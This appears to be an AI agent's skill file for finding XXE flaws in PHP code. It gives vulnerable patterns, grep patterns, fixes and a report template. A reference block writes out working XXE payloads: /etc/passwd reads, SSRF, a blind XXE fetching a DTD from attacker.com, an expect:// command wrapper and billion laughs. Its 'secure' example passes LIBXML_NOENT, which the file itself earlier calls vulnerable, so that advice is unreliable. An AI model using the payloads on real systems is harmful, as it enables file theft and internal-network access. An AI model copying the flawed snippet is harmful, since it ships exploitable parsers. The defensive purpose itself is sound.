---
name: acc-check-xxe
description: Analyzes PHP code for XML External Entity vulnerabilities. Detects unsafe XML parsers, missing entity protection, LIBXML flags issues, XSLT attacks.
---

# XXE (XML External Entity) Security Check

Analyze PHP code for XXE vulnerabilities (OWASP A03:2021).

## Detection Patterns

### 1. SimpleXML without Protection

```php
// CRITICAL: User input directly to simplexml
$xml = simplexml_load_string($_POST['xml']);
$xml = simplexml_load_file($_FILES['upload']['tmp_name']);

// CRITICAL: Default options allow entities
$xml = new SimpleXMLElement($userInput);

// VULNERABLE: LIBXML_NOENT enables entity substitution
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);
```

### 2. DOMDocument External Entities

```php
// CRITICAL: Loading user XML without protection
$doc = new DOMDocument();
$doc->loadXML($_POST['xml']);
$doc->load($_FILES['upload']['tmp_name']);

// CRITICAL: resolveExternals enabled
$doc = new DOMDocument();
$doc->resolveExternals = true;
$doc->loadXML($userXml);

// CRITICAL: substituteEntities enabled
$doc->substituteEntities = true;
```

### 3. XMLReader Vulnerabilities

```php
// CRITICAL: XMLReader with user input
$reader = new XMLReader();
$reader->open($_FILES['upload']['tmp_name']);
$reader->XML($_POST['xml']);

// VULNERABLE: setParserProperty for entities
$reader->setParserProperty(XMLReader::SUBST_ENTITIES, true);
```

### 4. Missing libxml_disable_entity_loader

```php
// CRITICAL: External entities not disabled (PHP < 8.0)
// libxml_disable_entity_loader(true) should be called

// VULNERABLE: Entity loader enabled
libxml_disable_entity_loader(false);
$xml = simplexml_load_string($userInput);

// Note: In PHP 8.0+, libxml_disable_entity_loader is deprecated
// External entities are disabled by default
```

### 5. XSLT Processor Attacks

```php
// CRITICAL: User-provided XSL stylesheet
$xsl = new DOMDocument();
$xsl->load($_FILES['stylesheet']['tmp_name']);

$proc = new XSLTProcessor();
$proc->importStyleSheet($xsl);
$proc->transformToXML($xmlDoc);

// CRITICAL: registerPHPFunctions enabled
$proc->registerPHPFunctions(); // Allows calling PHP functions from XSL
$proc->registerPHPFunctions(['system', 'exec']); // RCE!
```

### 6. SOAP Client XXE

```php
// CRITICAL: SOAP with user-controlled WSDL
$client = new SoapClient($_GET['wsdl']);

// CRITICAL: SOAP XML with entities
$client = new SoapClient($wsdl);
$response = $client->__doRequest($userXml, $location, $action, $version);
```

### 7. XML-RPC Vulnerabilities

```php
// CRITICAL: xmlrpc_decode with user input
$result = xmlrpc_decode($_POST['data']);

// CRITICAL: xmlrpc_decode_request
$params = xmlrpc_decode_request($rawPost, $method);
```

### 8. RSS/Atom Feed Parsing

```php
// CRITICAL: Parsing external feeds
$feed = simplexml_load_file($userProvidedUrl);

// CRITICAL: RSS feed with entities
$rss = new DOMDocument();
$rss->load($_GET['feed_url']);
```

### 9. SVG/XML File Upload

```php
// CRITICAL: SVG files can contain XXE
$svg = simplexml_load_file($_FILES['image']['tmp_name']);

// SVG example with XXE:
// <?xml version="1.0"?>
// <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
// <svg>&xxe;</svg>
```

### 10. XML in API Requests

```php
// CRITICAL: API accepting XML
$contentType = $_SERVER['CONTENT_TYPE'];
if (strpos($contentType, 'application/xml') !== false) {
    $xml = simplexml_load_string(file_get_contents('php://input'));
}
```

## XXE Attack Payloads (for reference)

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<foo>&xxe;</foo>

<!-- Parameter entity for blind XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>

<!-- PHP expect wrapper (if enabled) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>

<!-- Billion laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

## Grep Patterns

```bash
# SimpleXML functions
Grep: "(simplexml_load_string|simplexml_load_file|SimpleXMLElement)\s*\(" --glob "**/*.php"

# DOMDocument loading
Grep: "(loadXML|load)\s*\(" --glob "**/*.php"

# XMLReader
Grep: "XMLReader" --glob "**/*.php"

# XSLT
Grep: "XSLTProcessor|importStyleSheet" --glob "**/*.php"

# SOAP
Grep: "SoapClient|SoapServer" --glob "**/*.php"

# Entity loader status
Grep: "libxml_disable_entity_loader" --glob "**/*.php"

# LIBXML flags
Grep: "LIBXML_NOENT|LIBXML_DTDLOAD" --glob "**/*.php"
```

## Secure Patterns

### Disable External Entities

```php
// SECURE: PHP < 8.0
libxml_disable_entity_loader(true);

// SECURE: Use safe LIBXML options
$xml = simplexml_load_string(
    $data,
    'SimpleXMLElement',
    LIBXML_NONET | LIBXML_NOENT
);

// Note: LIBXML_NONET prevents network access
// LIBXML_NOENT = substitute entities, but with loader disabled is safe
```

### DOMDocument Safe Configuration

```php
// SECURE: DOMDocument with protection
$doc = new DOMDocument();
$doc->resolveExternals = false;
$doc->substituteEntities = false;

// PHP 8.0+: External entities disabled by default
// But explicitly set for defense in depth
$doc->loadXML($xml, LIBXML_NONET);
```

### XMLReader Safe Configuration

```php
// SECURE: XMLReader without entity expansion
$reader = new XMLReader();
$reader->open($file);
$reader->setParserProperty(XMLReader::SUBST_ENTITIES, false);
$reader->setParserProperty(XMLReader::LOADDTD, false);
```

### XSLT Safe Configuration

```php
// SECURE: XSLT without PHP functions
$proc = new XSLTProcessor();
// Do NOT call registerPHPFunctions()
$proc->importStyleSheet($trustedXsl);
$result = $proc->transformToXML($xml);

// SECURE: If functions needed, whitelist safe ones only
$proc->registerPHPFunctions(['date', 'number_format']);
```

### Validate XML Before Parsing

```php
// SECURE: Check for DTD declarations
final class SafeXmlParser
{
    public function parse(string $xml): SimpleXMLElement
    {
        // Reject XML with DOCTYPE (potential XXE)
        if (preg_match('/<!DOCTYPE/i', $xml)) {
            throw new SecurityException('DOCTYPE not allowed');
        }

        // Reject XML with entity declarations
        if (preg_match('/<!ENTITY/i', $xml)) {
            throw new SecurityException('ENTITY not allowed');
        }

        // Safe to parse
        libxml_use_internal_errors(true);

        $result = simplexml_load_string(
            $xml,
            'SimpleXMLElement',
            LIBXML_NONET
        );

        if ($result === false) {
            throw new ParseException('Invalid XML');
        }

        return $result;
    }
}
```

### Use JSON Instead

```php
// SECURE: Prefer JSON over XML when possible
// XML:
// <user><name>John</name><email>john@example.com</email></user>

// JSON (no XXE risk):
// {"name": "John", "email": "john@example.com"}

$data = json_decode($input, true, 512, JSON_THROW_ON_ERROR);
```

### SVG Sanitization

```php
// SECURE: Sanitize SVG uploads
final class SvgSanitizer
{
    public function sanitize(string $svg): string
    {
        // Remove DOCTYPE
        $svg = preg_replace('/<!DOCTYPE[^>]*>/i', '', $svg);

        // Remove entity declarations
        $svg = preg_replace('/<!ENTITY[^>]*>/i', '', $svg);

        // Remove processing instructions
        $svg = preg_replace('/<\?xml[^>]*\?>/i', '', $svg);

        // Remove script tags
        $svg = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $svg);

        return $svg;
    }
}
```

## Severity Classification

| Pattern | Severity | CWE |
|---------|----------|-----|
| User XML without entity protection | 🔴 Critical | CWE-611 |
| LIBXML_NOENT with user input | 🔴 Critical | CWE-611 |
| XSLT with registerPHPFunctions | 🔴 Critical | CWE-611 |
| SOAP with user WSDL | 🔴 Critical | CWE-611 |
| SVG upload without sanitization | 🟠 Major | CWE-611 |
| Missing LIBXML_NONET | 🟡 Minor | CWE-611 |

## Output Format

```markdown
### XXE: [Description]

**Severity:** 🔴 Critical
**Location:** `file.php:line`
**CWE:** CWE-611 (XML External Entity Reference)

**Issue:**
XML is parsed without disabling external entity processing, allowing file disclosure.

**Attack Vector:**
1. Attacker sends XML with external entity
2. Parser fetches file:///etc/passwd
3. File contents returned in response

**Code:**
```php
// Vulnerable
$xml = simplexml_load_string($_POST['xml']);
```

**Fix:**
```php
// Secure: Disable entities and network access
$xml = simplexml_load_string(
    $_POST['xml'],
    'SimpleXMLElement',
    LIBXML_NONET
);

// Better: Reject DOCTYPE entirely
if (preg_match('/<!DOCTYPE/i', $_POST['xml'])) {
    throw new SecurityException('DOCTYPE not allowed');
}
```

**References:**
- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
```
